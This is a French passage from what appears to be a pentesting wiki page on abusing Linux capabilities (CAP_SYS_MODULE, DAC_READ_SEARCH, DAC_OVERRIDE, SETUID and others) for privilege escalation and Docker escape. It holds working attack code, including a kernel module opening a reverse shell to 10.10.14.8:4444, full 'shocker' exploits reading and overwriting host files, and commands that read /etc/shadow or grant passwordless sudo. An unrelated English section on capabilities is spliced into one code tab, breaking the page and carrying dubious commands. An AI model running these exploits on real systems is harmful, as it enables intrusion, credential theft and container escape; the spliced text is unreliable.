5. **Injectez** et obtenez votre **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** permet à un processus de **charger et décharger des modules noyaux (appels système `init_module(2)`, `finit_module(2)` et `delete_module(2)`)**, offrant un accès direct aux opérations de base du noyau. Cette capacité présente des risques de sécurité critiques, car elle permet une élévation de privilèges et une compromission totale du système en autorisant des modifications du noyau, contournant ainsi tous les mécanismes de sécurité Linux, y compris les modules de sécurité Linux et l'isolation des conteneurs.
**Cela signifie que vous pouvez** **insérer/supprimer des modules noyaux dans/du noyau de la machine hôte.**

**Exemple avec un binaire**

Dans l'exemple suivant, le binaire **`python`** possède cette capacité.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Par défaut, la commande **`modprobe`** vérifie la liste des dépendances et les fichiers de mappage dans le répertoire **`/lib/modules/$(uname -r)`**.\
Pour exploiter cela, créons un faux dossier **lib/modules** :
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Ensuite, **compilez le module du noyau que vous pouvez trouver 2 exemples ci-dessous et copiez** le dans ce dossier :
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Enfin, exécutez le code Python nécessaire pour charger ce module de noyau :
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Exemple 2 avec binaire**

Dans l'exemple suivant, le binaire **`kmod`** possède cette capacité.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Cela signifie qu'il est possible d'utiliser la commande **`insmod`** pour insérer un module noyau. Suivez l'exemple ci-dessous pour obtenir un **shell inversé** en abusant de ce privilège.

**Exemple avec l'environnement (évasion de Docker)**

Vous pouvez vérifier les capacités activées à l'intérieur du conteneur Docker en utilisant :
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
À l'intérieur de la sortie précédente, vous pouvez voir que la capacité **SYS\_MODULE** est activée.

**Créez** le **module noyau** qui va exécuter un shell inversé et le **Makefile** pour le **compiler** :

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% endcode %}

{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
L'espace vide avant chaque mot make dans le Makefile **doit être une tabulation, pas des espaces**!
{% endhint %}

Exécutez `make` pour le compiler.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Enfin, démarrez `nc` à l'intérieur d'un shell et **chargez le module** depuis un autre pour capturer le shell dans le processus nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Le code de cette technique a été copié depuis le laboratoire "Abusing SYS\_MODULE Capability" de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Un autre exemple de cette technique peut être trouvé sur [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet à un processus de **contourner les autorisations de lecture des fichiers et de lecture et d'exécution des répertoires**. Son utilisation principale est la recherche de fichiers ou la lecture de fichiers. Cependant, il permet également à un processus d'utiliser la fonction `open_by_handle_at(2)`, qui peut accéder à n'importe quel fichier, y compris ceux en dehors de l'espace de nom de montage du processus. Le handle utilisé dans `open_by_handle_at(2)` est censé être un identifiant non transparent obtenu via `name_to_handle_at(2)`, mais il peut inclure des informations sensibles comme des numéros d'inode vulnérables à la manipulation. Le potentiel d'exploitation de cette capacité, en particulier dans le contexte des conteneurs Docker, a été démontré par Sebastian Krahmer avec l'exploit shocker, tel qu'analysé [ici](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Cela signifie que vous pouvez** **contourner les vérifications d'autorisation de lecture de fichiers et les vérifications d'autorisation de lecture/exécution de répertoires.**

**Exemple avec un binaire**

Le binaire pourra lire n'importe quel fichier. Ainsi, si un fichier comme tar possède cette capacité, il pourra lire le fichier shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Exemple avec binary2**

Dans ce cas, supposons que le binaire **`python`** a cette capacité. Pour lister les fichiers root, vous pourriez faire :
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Et pour lire un fichier, vous pourriez faire :
```python
print(open("/etc/shadow", "r").read())
```
**Exemple dans l'environnement (évasion de Docker)**

Vous pouvez vérifier les capacités activées à l'intérieur du conteneur Docker en utilisant :
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
À l'intérieur de la sortie précédente, vous pouvez voir que la capacité **DAC\_READ\_SEARCH** est activée. Par conséquent, le conteneur peut **déboguer les processus**.

Vous pouvez apprendre comment fonctionne l'exploitation suivante sur [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) mais en résumé, **CAP\_DAC\_READ\_SEARCH** nous permet non seulement de parcourir le système de fichiers sans vérifications de permission, mais supprime également explicitement toutes les vérifications à _**open\_by\_handle\_at(2)**_ et **pourrait permettre à notre processus d'accéder à des fichiers sensibles ouverts par d'autres processus**.

L'exploit original qui abuse de ces autorisations pour lire des fichiers de l'hôte peut être trouvé ici : [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), ce qui suit est une **version modifiée qui vous permet d'indiquer le fichier que vous souhaitez lire en premier argument et de le sauvegarder dans un fichier.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
L'exploit doit trouver un pointeur vers quelque chose monté sur l'hôte. L'exploit original utilisait le fichier /.dockerinit et cette version modifiée utilise /etc/hostname. Si l'exploit ne fonctionne pas, vous devrez peut-être définir un fichier différent. Pour trouver un fichier monté sur l'hôte, exécutez simplement la commande mount :
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**Le code de cette technique a été copié du laboratoire "Abusing DAC\_READ\_SEARCH Capability" de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) est l'événement de cybersécurité le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congrès est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybersécurité dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**Cela signifie que vous pouvez contourner les vérifications de permission en écriture sur n'importe quel fichier, vous pouvez donc écrire n'importe quel fichier.**

Il y a beaucoup de fichiers que vous pouvez **écraser pour escalader les privilèges,** [**vous pouvez trouver des idées ici**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Exemple avec un binaire**

Dans cet exemple, vim possède cette capacité, vous pouvez donc modifier n'importe quel fichier comme _passwd_, _sudoers_ ou _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Exemple avec le binaire 2**

Dans cet exemple, le binaire **`python`** aura cette capacité. Vous pourriez utiliser python pour remplacer n'importe quel fichier:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Exemple avec environnement + CAP_DAC_READ_SEARCH (Évasion de Docker)**

Vous pouvez vérifier les capacités activées à l'intérieur du conteneur Docker en utilisant :
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Tout d'abord, lisez la section précédente qui [**exploite la capacité DAC\_READ\_SEARCH pour lire des fichiers arbitraires**](linux-capabilities.md#cap\_dac\_read\_search) de l'hôte et **compilez** l'exploit.\
Ensuite, **compilez la version suivante de l'exploit shocker** qui vous permettra de **écrire des fichiers arbitraires** dans le système de fichiers de l'hôte :
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Pour échapper du conteneur Docker, vous pourriez **télécharger** les fichiers `/etc/shadow` et `/etc/passwd` de l'hôte, **ajouter** un **nouvel utilisateur** et utiliser **`shocker_write`** pour les écraser. Ensuite, **accédez** via **ssh**.

**Le code de cette technique a été copié du laboratoire "Abusing DAC\_OVERRIDE Capability" de** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**Cela signifie qu'il est possible de changer la propriété de n'importe quel fichier.**

**Exemple avec un binaire**

Supposons que le binaire **`python`** ait cette capacité, vous pouvez **changer** le **propriétaire** du fichier **shadow**, **changer le mot de passe root** et escalader les privilèges:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Ou avec le binaire **`ruby`** ayant cette capacité :
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**Cela signifie qu'il est possible de modifier les autorisations de n'importe quel fichier.**

**Exemple avec un binaire**

Si Python a cette capacité, vous pouvez modifier les autorisations du fichier shadow, **changer le mot de passe root**, et escalader les privilèges:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**Cela signifie qu'il est possible de définir l'identifiant d'utilisateur effectif du processus créé.**

**Exemple avec un binaire**

Si python a cette **capacité**, vous pouvez très facilement en abuser pour escalader les privilèges vers root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Une autre méthode :**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**Cela signifie qu'il est possible de définir l'identifiant de groupe effectif du processus créé.**

Il y a beaucoup de fichiers que vous pouvez **écraser pour escalader les privilèges,** [**vous pouvez trouver des idées ici**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Exemple avec un binaire**

Dans ce cas, vous devriez chercher des fichiers intéressants qu'un groupe peut lire car vous pouvez vous faire passer pour n'importe quel groupe:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Une fois que vous avez trouvé un fichier que vous pouvez exploiter (en le lisant ou en l'écrivant) pour escalader les privilèges, vous pouvez **obtenir un shell en vous faisant passer pour le groupe intéressant** avec :
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
Dans ce cas, le groupe shadow a été impersonné afin de pouvoir lire le fichier `/etc/shadow`:
```bash
cat /etc/shadow
```
Si **docker** est installé, vous pourriez **usurper** le **groupe docker** et l'exploiter pour communiquer avec le [**socket docker** et escalader les privilèges](./#writable-docker-socket).

## CAP\_SETFCAP

**Cela signifie qu'il est possible de définir des capacités sur des fichiers et des processus**

**Exemple avec un binaire**

Si Python a cette **capacité**, vous pouvez facilement l'exploiter pour escalader les privilèges vers root :

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
Notez que si vous définissez une nouvelle capacité pour le binaire avec CAP\_SETFCAP, vous perdrez cette capacité.
{% endhint %}

Une fois que vous avez la [capacité SETUID](linux-capabilities.md#cap\_setuid), vous pouvez aller dans sa section pour voir comment escalader les privilèges.

**Exemple avec l'environnement (évasion de Docker)**

Par défaut, la capacité **CAP\_SETFCAP est donnée au processus à l'intérieur du conteneur Docker**. Vous pouvez vérifier cela en faisant quelque chose comme:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Cette capacité permet de **donner toute autre capacité aux binaires**, donc nous pourrions envisager une **évasion** du conteneur en **abusant de l'une des autres failles de capacité** mentionnées sur cette page.\
Cependant, si vous essayez de donner par exemple les capacités CAP\_SYS\_ADMIN et CAP\_SYS\_PTRACE au binaire gdb, vous constaterez que vous pouvez les donner, mais le **binaire ne pourra pas s'exécuter après cela**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[Depuis la documentation](https://man7.org/linux/man-pages/man7/capabilities.7.html) : _Permitted : Il s'agit d'un **sous-ensemble limitant pour les capacités effectives** que le thread peut assumer. C'est également un sous-ensemble limitant pour les capacités qui peuvent être ajoutées à l'ensemble hérité par un thread qui **n'a pas la capacité CAP\_SETPCAP** dans son ensemble effectif._\
Il semble que les capacités Permitted limitent celles qui peuvent être utilisées.\
Cependant, Docker accorde également par défaut le **CAP\_SETPCAP**, donc vous pourriez être en mesure de **définir de nouvelles capacités à l'intérieur des capacités héritées**.\
Cependant, dans la documentation de cette capacité : _CAP\_SETPCAP : \[...\] **ajoute toute capacité de l'ensemble de délimitation du thread appelant** à son ensemble hérité_.\
Il semble que nous ne puissions ajouter que des capacités de l'ensemble de délimitation à l'ensemble hérité. Ce qui signifie que **nous ne pouvons pas ajouter de nouvelles capacités comme CAP\_SYS\_ADMIN ou CAP\_SYS\_PTRACE dans l'ensemble hérité pour escalader les privilèges**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) fournit un certain nombre d'opérations sensibles, y compris l'accès à `/dev/mem`, `/dev/kmem` ou `/proc/kcore`, la modification de `mmap_min_addr`, l'accès aux appels système `ioperm(2)` et `iopl(2)`, et diverses commandes de disque. L'`ioctl(2)` FIBMAP est également activé via cette capacité, ce qui a causé des problèmes dans le [passé](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Selon la page de manuel, cela permet également au détenteur de `réaliser de manière descriptive une gamme d'opérations spécifiques à un périphérique sur d'autres périphériques`.

Cela peut être utile pour **l'escalade de privilèges** et **l'évasion de Docker**.

## CAP\_KILL

**Cela signifie qu'il est possible de tuer n'importe quel processus.**

**Exemple avec un binaire**

Supposons que le binaire **`python`** a cette capacité. Si vous pouviez **également modifier la configuration de certains services ou sockets** (ou tout fichier de configuration lié à un service), vous pourriez y introduire une porte dérobée, puis tuer le processus lié à ce service et attendre que le nouveau fichier de configuration soit exécuté avec votre porte dérobée.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc avec kill**

Si vous avez des capacités de kill et qu'il y a un **programme node en cours d'exécution en tant que root** (ou en tant qu'un utilisateur différent), vous pourriez probablement **lui envoyer** le **signal SIGUSR1** et le faire **ouvrir le débogueur node** où vous pouvez vous connecter.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) est l'événement le plus pertinent en matière de cybersécurité en **Espagne** et l'un des plus importants en **Europe**. Avec **pour mission de promouvoir les connaissances techniques**, ce congrès est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybersécurité dans chaque discipline.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**Cela signifie qu'il est possible d'écouter sur n'importe quel port (même sur des ports privilégiés).** Vous ne pouvez pas escalader directement les privilèges avec cette capacité.

**Exemple avec un binaire**

Si **`python`** a cette capacité, il pourra écouter sur n'importe quel port et même se connecter depuis ce port à n'importe quel autre port (certains services nécessitent des connexions à partir de ports spécifiques privilégiés)

{% tabs %}
{% tab title="Écouter" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="Connect" %} 

### Linux Capabilities

#### Introduction

Linux capabilities provide a fine-grained access control mechanism that allows specific privileges to be assigned to a process. This can be used to reduce the privileges of a process, making it more secure by limiting the damage that can be done if the process is compromised.

#### Viewing Capabilities

To view the capabilities of a process, you can use the `getpcaps` command from the `libcap` package:

```bash
getpcaps <pid>
```

#### Modifying Capabilities

You can modify the capabilities of a process using the `setpcaps` command from the `libcap` package:

```bash
setpcaps <capabilities> <pid>
```

#### Examples

To drop all capabilities from a process:

```bash
setpcaps = <pid>
```

To add a specific capability to a process:

```bash
setpcaps +<capability> <pid>
```

#### Common Capabilities

Some common capabilities include:

- `CAP_DAC_OVERRIDE`: Bypass file read/write permission checks
- `CAP_DAC_READ_SEARCH`: Bypass file read permission checks
- `CAP_NET_RAW`: Use RAW and PACKET sockets
- `CAP_SYS_ADMIN`: Perform a range of system administration tasks

#### Conclusion

Linux capabilities are a powerful tool for fine-tuning the privileges of processes, enhancing the security of a system by limiting the scope of potential attacks. Understanding how to view and modify capabilities can help in hardening a system against privilege escalation attacks.

{% endtab %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet aux processus de **créer des sockets RAW et PACKET**, leur permettant de générer et d'envoyer des paquets réseau arbitraires. Cela peut entraîner des risques de sécurité dans les environnements conteneurisés, tels que le spoofing de paquets, l'injection de trafic et le contournement des contrôles d'accès réseau. Des acteurs malveillants pourraient exploiter cela pour perturber le routage des conteneurs ou compromettre la sécurité du réseau hôte, surtout sans protections adéquates de pare-feu. De plus, **CAP_NET_RAW** est crucial pour les conteneurs privilégiés afin de prendre en charge des opérations telles que le ping via des requêtes ICMP RAW.

